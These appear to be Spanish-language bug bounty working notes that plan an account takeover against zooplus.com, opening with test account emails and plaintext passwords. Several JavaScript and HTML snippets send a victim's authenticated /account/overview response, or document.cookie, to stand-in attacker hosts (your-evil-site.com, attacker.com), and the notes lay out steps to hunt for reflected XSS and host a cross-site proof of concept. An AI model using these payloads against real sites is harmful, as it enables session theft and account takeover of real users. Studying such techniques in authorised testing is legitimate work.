---
tags:
  - BugBounty
---
---
## Acounts
***A***:
- agussepu+demo3@wearehackerone.com 
- password: 123456As
- firstname: TestUno
- LastName: testingUno

***B***:
- TestDos
- victim
- agussepu+demo4@wearehackerone.com 
- pass: asdfT1234

--- 

# Objetivo 

> **Obtener las cookies `MZPSID` y `mzpStickySession`** del navegador de la víctima, para luego hacer un `GET /account/overview` y obtener el JWT del usuario víctima.

---

### ✅ 1. **XSS reflejada o DOM-based**

#### ➤ ¿Qué es?

Un XSS reflejada ocurre cuando puedes inyectar y ejecutar JavaScript desde una URL en Zooplus que no lo filtra bien. Ejemplo:

```
https://www.zooplus.com/search?q=<script>...</script>
```

#### ➤ ¿Cómo te ayuda?

Aunque no puedas leer las cookies (`HttpOnly` lo impide), **puedes hacer que el navegador las use automáticamente** con `fetch()` o `XMLHttpRequest`.

Esto significa que **puedes automatizar una request a `/account/overview` desde la sesión de la víctima** y robar la **respuesta** (que incluye el JWT).

#### ➤ Ejemplo de ataque con XSS:

```js
fetch("https://www.zooplus.com/account/overview", {
  credentials: "include"
})
  .then(r => r.text())
  .then(jwt => {
    fetch("https://your-evil-site.com/log?data=" + btoa(jwt));
  });
```

➡️ **Resultado**: obtienes el JWT sin tener acceso a las cookies.  
💥 Esto **cierra el círculo del ATO**: tienes el JWT → puedes modificar los datos del usuario.

---

### ✅ 2. **CSRF con fuga de JWT**

#### ➤ ¿Qué es?

CSRF (Cross-Site Request Forgery) permite que un atacante haga que el navegador víctima **envíe una request con sus cookies**, sin que el usuario lo sepa.

Aunque **no puedes ver la respuesta** directamente (por CORS y SOP), si el servidor de Zooplus:

- **No tiene CORS restrictivo**
    
- **O devuelve algo legible (como en HTML o redirección)**
    

...entonces **puedes hacer que la respuesta se refleje o se filtre de alguna forma**.

#### ➤ Qué necesitas probar:

```js
fetch("https://www.zooplus.com/account/overview", {
  credentials: "include"
});
```

➡️ Pruebas:

- ¿Responde con 200?
    
- ¿Devuelve el JWT en el cuerpo?
    
- ¿Puedes leer ese cuerpo desde otro origen? (poco probable, pero si lo permite, tienes jackpot)
    

➡️ Si no puedes leerlo directamente, todavía puedes **usar side-channels**:

- Medir el tamaño de respuesta
    
- Ver si responde distinto según el usuario
    

🔍 Puedes intentar esto con un HTML malicioso en GitHub Pages y ver si hay diferencias.

---

### ✅ 3. **Reflejo de datos vía fetch**

#### ➤ ¿Qué es?

Es similar al CSRF, pero en este caso, **buscas que Zooplus te devuelva algo directamente útil en la respuesta** a un `fetch()` cross-site.

Por ejemplo:

```js
fetch("https://www.zooplus.com/account/overview", {
  credentials: "include"
})
  .then(res => res.text())
  .then(html => {
    fetch("https://attacker.com/log?d=" + btoa(html));
  });
```

#### ➤ ¿Cómo ayuda esto?

Si el endpoint devuelve el JWT en la respuesta (como cabecera `Authorization: Bearer`, o en el HTML del dashboard del usuario), puedes capturarlo así.

📌 Requisitos para que funcione:

- Que la respuesta **no esté protegida con CORS**
    
- Que el navegador **permita leerla**
    
- Que **el JWT esté presente** en la respuesta
    

➡️ Si alguna de estas condiciones se cumple, puedes **extraer el JWT directamente sin robar las cookies**.

---

## 🧠 En resumen

| Método                       | Requiere XSS | Se basa en cookies | Puede devolver JWT | Puedes leer respuesta |
| ---------------------------- | ------------ | ------------------ | ------------------ | --------------------- |
| XSS + `fetch`                | ✅ Sí         | ✅ Sí               | ✅ Sí               | ✅ Sí                  |
| CSRF + `fetch`               | ❌ No         | ✅ Sí               | ✅/❌ Depende        | ❌ (bloqueado por SOP) |
| Reflejo de datos via `fetch` | ❌ No         | ✅ Sí               | ✅ Si hay leak      | ✅ Si no hay CORS      |

---

## ✅ ¿Qué te recomiendo hacer?

### Paso 1: **Buscar un XSS funcional**

- Revisa parámetros reflejados: `returnUrl`, `q`, `search`, `category`, etc.
    
- Usa payloads como:
    
    ```html
    <script>fetch('https://attacker.com?c='+document.cookie)</script>
    ```
    

### Paso 2: **Si encuentras una, prueba `fetch('/account/overview')`**

- Analiza si puedes obtener el JWT.
    
- O al menos datos que confirmen el usuario.
    

### Paso 3: **Si no hay XSS**, intenta detectar **si `/account/overview` se puede leer cross-site**

- Crea una GitHub Page con un PoC como este:
    
    ```js
    fetch("https://www.zooplus.com/account/overview", { credentials: "include" })
      .then(r => r.text())
      .then(d => fetch("https://attacker.com/leak?d=" + btoa(d)));
    ```
    
